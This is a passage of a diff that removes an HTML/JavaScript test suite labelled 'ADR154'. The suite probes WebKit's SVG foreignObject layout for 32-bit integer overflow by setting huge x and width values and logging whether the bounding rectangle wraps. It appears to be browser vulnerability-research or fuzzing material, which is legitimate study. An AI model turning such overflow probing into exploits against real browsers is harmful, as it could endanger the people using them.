-// overflow to 2^31 each, and right = (int32)(2^31 + 2^31) = 0.
-//
-// This creates a layout box where:
-//   left  = 2^31 (or -2^31 in signed)
-//   right = 0
-//   width = 0 - 2^31 = -2^31 (negative width!)
-//
-// Or alternatively: if WebKit uses unsigned 32-bit internally for coordinates,
-//   left  = 0x80000000
-//   right = 0x00000000 (overflow wraps)
-//   width = 0x80000000 (huge)
-//
-// Test: set both fo.x AND fo.width to 1e10 via TearOff.
-// Check if getBCR.right wraps in an interesting way.
-// Check if div inside has a right edge at position 0.
-// ═══════════════════════════════════════════════════════════════
-suites['ADR154']=function(){
-  L('ADR154: right-edge wrap — fo.x=1e10 + fo.width=1e10 → right=2^32=0?','info');
-  var svg=document.createElementNS(SVG_NS,'svg');
-  svg.setAttribute('width','400');svg.setAttribute('height','400');
-  svg.setAttribute('viewBox','0 0 400 400');
-  document.body.appendChild(svg);
-
-  var fo=document.createElementNS(SVG_NS,'foreignObject');
-  fo.setAttribute('x','0');fo.setAttribute('y','0');
-  fo.setAttribute('width','200');fo.setAttribute('height','200');
-  svg.appendChild(fo);
-
-  var div=document.createElement('div');
-  div.style.cssText='width:100%;height:100%;background:blue';
-  fo.appendChild(div);
-
-  // Baseline
-  var bb0=fo.getBoundingClientRect();
-  L('ADR154: baseline: x='+bb0.x+' w='+bb0.width+' right='+bb0.right,'info');
-
-  var FOX=fo.x.baseVal;
-  var FOW=fo.width.baseVal;
-
-  // Set both to 1e10
-  FOX.value=1e10;
-  FOW.value=1e10;
-  L('ADR154: wrote fo.x=1e10, fo.width=1e10 via TearOff','info');
-
-  var bb1=fo.getBoundingClientRect();
-  var dbcr=div.getBoundingClientRect();
-  L('ADR154: fo BCR: x='+bb1.x+' w='+bb1.width+' right='+bb1.right,'info');
-  L('ADR154: div BCR: x='+dbcr.x+' w='+dbcr.width+' right='+dbcr.right,'info');
-
-  // Is the right = 0?
-  if(bb1.right===0||bb1.right<bb1.x){
-    L('★★★ ADR154: RIGHT EDGE WRAP! right='+bb1.right+' (wraps past zero)','hit');
-  }
-
-  // Is the right = 2^32 = 4294967296?
-  if(Math.abs(bb1.right-4294967296)<1000){
-    L('★★★ ADR154: right≈2^32 (unsigned wrap)', 'hit');
-  }
-
-  // What if we set only x to 1e10, width to normal?
-  FOX.value=1e10;FOW.value=200;
-  var bb2=fo.getBoundingClientRect();
-  L('ADR154: x=1e10 w=200: x='+bb2.x+' w='+bb2.width+' right='+bb2.right,'info');
-
-  // What if x=0 and we set only width to 1e10?
-  FOX.value=0;FOW.value=1e10;
-  var bb3=fo.getBoundingClientRect();
-  L('ADR154: x=0 w=1e10: x='+bb3.x+' w='+bb3.width+' right='+bb3.right,'info');
-
-  // Try x=2^31-1 (INT32_MAX), width=1 → right = 2^31 → overflows?
-  FOX.value=2147483647;FOW.value=1;
-  var bb4=fo.getBoundingClientRect();
-  L('ADR154: x=INT32_MAX w=1: x='+bb4.x+' w='+bb4.width+' right='+bb4.right,'info');
-
-  // Try x=2^30, width=2^30 → right = 2^31 → at the exact overflow boundary
-  FOX.value=1073741824;FOW.value=1073741824;
-  var bb5=fo.getBoundingClientRect();
-  L('ADR154: x=2^30 w=2^30: x='+bb5.x+' w='+bb5.width+' right='+bb5.right,'info');
-  if(bb5.right<0||bb5.right===0){L('★★★ ADR154: right wraps at x+w=2^31!','hit');}
-
-  svg.remove();
-};
+  svg5.remove();
+}
 </script>
 </body>
 </html>
